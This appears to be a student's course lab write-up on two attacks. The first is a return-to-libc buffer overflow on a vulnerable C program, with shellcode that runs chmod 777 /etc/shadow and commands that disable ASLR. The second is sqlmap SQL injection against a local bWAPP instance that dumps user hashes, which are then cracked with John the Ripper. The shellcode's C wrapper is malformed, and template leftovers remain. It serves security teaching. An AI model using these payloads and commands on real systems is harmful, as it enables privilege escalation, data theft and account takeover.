
<h1>Lab #1,22110035, Nguyen Gia Huy, Information Security_Nhom03FIE</h1>
# Task 1: Software buffer overflow attack
 
Given a vulnerable C program 
```
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```
and a shellcode in C. This shellcode executes chmod 777 /etc/shadow without having to sudo to escalate privilege
```
#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x89\xc3\x31\xd8\x50\xbe\x3e\x1f"
"\x3a\x56\x81\xc6\x23\x45\x35\x21"
"\x89\x74\x24\xfc\xc7\x44\x24\xf8"
"\x2f\x2f\x73\x68\xc7\x44\x24\xf4"
"\x2f\x65\x74\x63\x83\xec\x0c\x89"
"\xe3\x66\x68\xff\x01\x66\x59\xb0"
"\x0f\xcd\x80";

int
void main() {
    int (*ret)() = (int(*)())code;
}
```
**Question 1**:
- Compile both C programs and shellcode to executable code. 
- Conduct the attack so that when C executable code runs, shellcode willc also be triggered. 
  You are free to choose Code Injection or Environment Variable approach to do. 
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
**Answer 1**: Must conform to below structure:
***1. Preparation***
***Step 1: Run the command below to setup the environment***


![image](https://github.com/user-attachments/assets/9d60f525-a514-454a-bdd1-52dc5775aafa)


***Step 2***


I will create a vulnerable.c file and insert this code into it


```
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```


And create shellcode.c and insert this code:
```
#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x89\xc3\x31\xd8\x50\xbe\x3e\x1f"
"\x3a\x56\x81\xc6\x23\x45\x35\x21"
"\x89\x74\x24\xfc\xc7\x44\x24\xf8"
"\x2f\x2f\x73\x68\xc7\x44\x24\xf4"
"\x2f\x65\x74\x63\x83\xec\x0c\x89"
"\xe3\x66\x68\xff\x01\x66\x59\xb0"
"\x0f\xcd\x80";

int
void main() {
    int (*ret)() = (int(*)())code;
}
```


***Step 3: Inspect stack frame of vulnerable.c***


![image](https://github.com/user-attachments/assets/7456edf8-8706-43d8-ab49-0f8fc6372dfc)


***Idea***


My idea for this task is to inject the system address into the return address, so that when the program finishes, it will redirect to the system function. When the system function is loaded into the stack frame, I will load the address of the SHELLCODE environment variable that we have exported into the parameter of the system address.




***2. Attack***
***2.1. Compile file***
Compile the vulnerable.c and shellcode.c with following command: 
```
gcc -g vulnerable.c -o vulnerable.out -fno-stack-protector -mpreferred-stack-boundary=2
```

```
gcc -g shellcode.c -o shellcode.out -fno-stack-protector -mpreferred-stack-boundary=2
```

***2.2. Disabling Security Features***

Create a link to zsh instead of the default dash to disable the bash countermeasures in Ubuntu 16.04.
```
sudo ln -sf /bin/zsh /bin/sh
```

Disable the operating system's address space layout randomization.

```
sudo sysctl -w kernel.randomize_va_space=0
```

***2.3. Export environment variable***
Then, we declare an environment variable named SHELLCODE to store the path of the output file after compiling shellcode.c.

```
export SHELLCODE=/home/seed/seclabs/bof/shellcode.o
```

***2.4. Debug vulnerable.c file with gdb to find the address of system function, exit fuction, SHELLCODE variable***
Run code & debug:
```
gdb -q env.out
start
```
Then find the neccessary address:

```
p system
p exit
print getenv("SHELLCODE")
```

![image](https://github.com/user-attachments/assets/aa843bb3-8121-4d7f-abb0-e679acf38d90)


Observing the results:

Address of system(): 0xf7e50db0
Address of exit(): 0xf7e449e0
Address of VULNP: 0xffffd8fd

***2.5. ATTACK***
Run the command: 
```
  run $(python -c "print('a'*20 + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' + '\xfd\xd8\xff\xff')")
```
Explain command: This command first overwrites the return address with the system function's address. Once the system function is loaded, the stack will interpret the next memory location (ebp+4) as the return address. To ensure the program exits cleanly, I will then place the exit function address here. Finally, for the system function's parameter (located at ebp+8), I will provide the address of the SHELLCODE environment variable. This way, when the system function runs, it will execute the code stored in the SHELLCODE variable.


After running command, here's the result:

![image](https://github.com/user-attachments/assets/cba772fc-cbf6-4b33-8d46-297bf7a9a9e8)



















  
1. Idea
`StackFrame` của chương trình 

``` 
    code block (optional)
```

output screenshot (optional)

**Conclusion**: comment text about the screenshot or simply answered text for the question

# Task 2: Attack on the database of bWapp 
- Install bWapp (refer to quang-ute/Security-labs/Web-security). 
- Install sqlmap.
- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup. 

**Question 1**: Use sqlmap to get information about all available databases
**Answer 1**:


***Step1***


First we login to the web with username: bee, password: bug


![image](https://github.com/user-attachments/assets/6f445219-db7b-42fe-ba05-df6fd2b57b07)


***Step2***
After that, we choose SQL Injection (get/select) option and click Hack button
![image](https://github.com/user-attachments/assets/68ba1787-ad5d-4cb2-bdb7-ea59a73df331)


***Step3***


We will be redirected to the page http://localhost:8025/sqli_2.php
We collect the cookie of the webpage
![image](https://github.com/user-attachments/assets/24420808-15de-4de0-9a18-28aef6a30bd4)
We can observe that the cookie = qsfi47oc645khe9eimnnr9kcm5; security_level=0


***Step4***


We will start using SQLMap to find the existing databases of the website.


Run the command: python sqlmap.py -u "http://localhost:8025/sqli_2.php?movie=1" --dbs --cookie="qsfi47oc645khe9eimnnr9kcm5; security_level=0"


Explain the command: This command runs SQLMap to test the URL http://localhost:8025/sqli_2.php?movie=1 for SQL injection vulnerabilities. The --dbs option 
instructs SQLMap to enumerate and display the databases available on the target server. The --cookie option provides session cookies for authentication, allowing SQLMap to interact with the web application as an authenticated user.


Result:


![image](https://github.com/user-attachments/assets/5e009099-2b49-494e-8524-0ef11f38168d)


We can see that there are 4 available database: bWAPP, information_schema, mysql, performance_schema

**Question 2**: Use sqlmap to get tables, users information


**Answer 2**:


***Step1***


To view user information, we need to know the information of the tables in each database


So I will try to see the table information in each database, starting with the first bWAPP database


Run the command: python sqlmap.py -u "http://localhost:8025/sqli_2.php?movie=1" -D bWAPP --tables --cookie="PHPSESSID=qsfi47oc645khe9eimnnr9kcm5;security_level=0"


Explain command: This command executes SQLMap to test the URL http://localhost:8025/sqli_2.php?movie=1 for SQL injection vulnerabilities, specifically targeting the database bWAPP. The -D bWAPP option specifies that SQLMap should focus on this particular database. The --tables option instructs SQLMap to enumerate and display the tables within the specified database. The --cookie option provides session cookies for authentication, allowing SQLMap to interact with the web application as an authenticated user.


Result: 

![image](https://github.com/user-attachments/assets/15be522e-ed1f-4317-9156-281f87c6a74c)


We can observer that there are 5 table in the bWAPP database. 


***Step2***


Based on the table names, we can easily guess the user information stored in the users table in the bWAPP database


So we will read the contents of the Users table


Run the command: python sqlmap.py -u "http://localhost:8025/sqli_2.php?movie=1" -D bWAPP -T users --dump --cookie="PHPSESSID=qsfi47oc645khe9eimnnr9kcm5;security_level=0"


Explain command: This command runs SQLMap to test the URL http://localhost:8025/sqli_2.php?movie=1 for SQL injection vulnerabilities, focusing specifically on the database bWAPP and the users table. The -D bWAPP option specifies the target database, while the -T users option indicates that SQLMap should operate on the users table. The --dump option instructs SQLMap to extract and display all the data from the specified table. The --cookie option provides session cookies for authentication, allowing SQLMap to interact with the web application as an authenticated user.


Result:

![image](https://github.com/user-attachments/assets/29db088a-65c2-4383-9c18-cd040a2d820a)


Based on the image above, we can see the user information and hashed passwords
Here are the two users with their corresponding hashed passwords:

User 1:

Email: bwapp-aim@mailinator.com
Login: A.I.M.
Password (Hashed): 6885858486f31043e5839c735d99457f045affd0


User 2:

Email: bwapp-bee@mailinator.com
Login: bee
Password (Hashed): 6885858486f31043e5839c735d99457f045affd0

**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
**Answer 3**:

***Step1***


Tải John Ripper thông qua đường link: https://www.openwall.com/john/


***Step2***


Chạy terminal trong thư mục run 


***Step3***


Lưu password của 2 user trong 1 file txt


![image](https://github.com/user-attachments/assets/c32d03e7-e6e4-48ce-b012-77a213f71dc0)


***Step4***


Chạy lệnh ./john D:/pw.txt


Và ra được kết quả 


![image](https://github.com/user-attachments/assets/8258a0f7-f487-4c97-99c4-f612b7d4421f)


***Step5***
Login thử với password đã được giải mã:
Login: A.I.M.
Password (Hashed): 6885858486f31043e5839c735d99457f045affd0


![image](https://github.com/user-attachments/assets/1cce6875-02b6-438a-b3c6-fd1a648c3284)


Login thành công và ta có thể thấy được đã vào được trang chủ của admin A.I.M.


![image](https://github.com/user-attachments/assets/a591b179-62b1-4455-94ff-b4d0b52f5b2e)





